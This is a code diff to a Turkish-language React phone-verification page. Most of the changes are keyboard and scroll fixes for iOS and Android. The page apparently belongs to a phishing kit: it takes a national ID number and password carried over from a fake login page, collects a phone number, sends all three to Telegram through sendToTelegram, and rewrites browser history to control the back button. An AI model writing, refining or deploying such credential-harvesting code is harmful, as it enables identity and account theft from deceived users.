@@ -4,6 +4,8 @@ import './App.css';
 import { useAuth, AuthProvider } from './AuthContext';
 import { ScrollProvider, useScroll } from './ScrollContext';
 
+const isIOS = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
 function PhoneVerificationPageContent() {
   const [state, setState] = React.useState({
     phoneNumber: '',
@@ -23,36 +25,24 @@ function PhoneVerificationPageContent() {
   const { dispatch: authDispatch } = useAuth();
   const { tc, password, isValidNavigation } = location.state || {};
 
-  // Debounce fonksiyonu: Scroll ve input işlemleri için gecikme sağlar
-  const debounce = (func, delay) => {
-    let timer;
-    return (...args) => {
-      clearTimeout(timer);
-      timer = setTimeout(() => func(...args), delay);
-    };
-  };
-
   // Navigasyon ve geri tuşu kontrolü
   useEffect(() => {
-    // Geçersiz navigasyon kontrolü
     if (!isValidNavigation || !tc || !password || tc.length !== 11 || password.length !== 6) {
       setState((prev) => ({
-        ...prev, // Hata düzeltildi: ...ქ yerine ...prev
+        ...prev,
         showPhoneError: true,
         errorMessage: 'Lütfen önce giriş yapın.',
       }));
-      authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
+      authDispatch({ type: 'RESET_AUTH' });
       navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
       return;
     }
 
-    // Tarayıcı geçmişini yönet
     window.history.replaceState({ page: 'telefon' }, '', '/telefon');
     window.history.pushState({ page: 'telefon-guard' }, '', '/telefon');
 
-    // Geri tuşu için popstate olayı
     const handlePopState = () => {
-      authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
+      authDispatch({ type: 'RESET_AUTH' });
       window.history.replaceState(null, '', '/giris');
       navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
     };
@@ -65,25 +55,35 @@ function PhoneVerificationPageContent() {
   useEffect(() => {
     const meta = document.createElement('meta');
     meta.name = 'viewport';
-    meta.content = 'width=device-width, initial-scale=1.0, interactive-widget=overlays-content';
+    meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=overlays-content';
     document.head.appendChild(meta);
 
-    if ("virtualKeyboard" in navigator) {
+    if (!isIOS() && 'virtualKeyboard' in navigator) {
       navigator.virtualKeyboard.overlaysContent = true;
       navigator.virtualKeyboard.ongeometrychange = () => {
-        document.body.style.setProperty('--keyboard-height', `${navigator.virtualKeyboard.boundingRect.height}px`);
+        const kbHeight = navigator.virtualKeyboard.boundingRect.height;
+        document.body.style.setProperty('--keyboard-height', `${kbHeight}px`);
+        const rightSection = rightSectionRef.current;
+        if (rightSection) {
+          rightSection.style.paddingBottom = `${kbHeight + 150}px`;
+        }
       };
+    } else if (isIOS()) {
+      const rightSection = rightSectionRef.current;
+      if (rightSection) {
+        rightSection.style.paddingBottom = '150px';
+      }
     }
 
     return () => {
       document.head.removeChild(meta);
     };
-  }, []);
+  }, [rightSectionRef]);
 
   // Sayfa yüklendiğinde en üste kaydır
   useEffect(() => {
     const scrollToTop = () => {
-      if (rightSectionRef.current) { // Hata düzeltildi: juxtaposed kaldırıldı
+      if (rightSectionRef.current) {
         rightSectionRef.current.scrollTop = 0;
         rightSectionRef.current.dataset.loaded = "true";
         console.log('Sayfa en üste kaydırıldı');
@@ -102,30 +102,38 @@ function PhoneVerificationPageContent() {
     const phoneRef = phoneInputRef.current;
 
     const handleFocusScroll = () => {
+      const rightSection = rightSectionRef.current;
+      if (!rightSection || !phoneRef) return;
+
+      if (isIOS()) {
+        setTimeout(() => {
+          requestAnimationFrame(() => {
+            phoneRef.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          });
+        }, 200);
+        return;
+      }
+
       const isAndroid = /Android/i.test(navigator.userAgent);
       if (!isAndroid) return;
 
-      const adjustScroll = debounce(() => {
-        const rightSection = rightSectionRef.current;
-        const buttonPhone = document.querySelector('.button-phone');
-        if (!rightSection || !buttonPhone) return;
+      const inputRect = phoneRef.getBoundingClientRect();
+      const viewportHeight = window.visualViewport?.height || window.innerHeight;
+      const offset = 150;
 
-        const viewportHeight = window.visualViewport?.height || window.innerHeight;
-        const keyboardHeight = window.innerHeight - viewportHeight;
-
-        rightSection.style.height = `${viewportHeight}px`;
-        rightSection.style.paddingBottom = `${keyboardHeight + 20}px`;
-        buttonPhone.scrollIntoView({ block: 'end', behavior: 'smooth' });
-      }, 50);
-
-      setTimeout(adjustScroll, 200);
+      setTimeout(() => {
+        requestAnimationFrame(() => {
+          const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
+          rightSection.scrollTo({ top: scrollTo, behavior: 'smooth' });
+        });
+      }, 200);
     };
 
     const handleBlurScroll = () => {
       const rightSection = rightSectionRef.current;
       if (rightSection) {
         rightSection.style.height = '100vh';
-        rightSection.style.paddingBottom = '0';
+        rightSection.style.paddingBottom = isIOS() ? '150px' : '0';
         rightSection.scrollTo({ top: 0, behavior: 'smooth' });
       }
     };
@@ -247,7 +255,7 @@ function PhoneVerificationPageContent() {
         setState((prev) => ({ ...prev, isSubmitting: true }));
         const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });
         if (result && !result.error) {
-          authDispatch({ type: 'RESET_AUTH' }); // Başarılı gönderimde de sıfırla
+          authDispatch({ type: 'RESET_AUTH' });
           setState({
             phoneNumber: '',
             isPhoneActive: false,
